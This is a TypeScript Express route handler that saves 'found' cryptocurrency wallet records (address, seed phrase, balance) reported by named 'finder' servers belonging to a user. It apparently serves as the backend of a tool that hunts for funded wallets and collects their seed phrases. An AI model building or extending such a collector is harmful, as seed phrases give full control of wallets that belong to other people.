import { Request, Response } from "express";
import { Server } from "../models/Server.ts";
import { Found } from "../models/Found.ts";

export async function addFound(req: Request, res: Response) {
  const { finderName, address, seedPhrase, balance } = req.body;
  const ownerId = req.user!._id;
  try {
    const finder = await Server.findOne({
      owner: ownerId,
      serverName: finderName
    });
    const found = new Found({
      finder: finder!._id,
      address: address,
      seedPhrase: seedPhrase,
      balance: balance
    });
    await found.save();
    return res.status(200).json({ message: "Sent found data" });
  } catch (err) {
    return res.status(500).json({ message: "Server error" });
  }
}
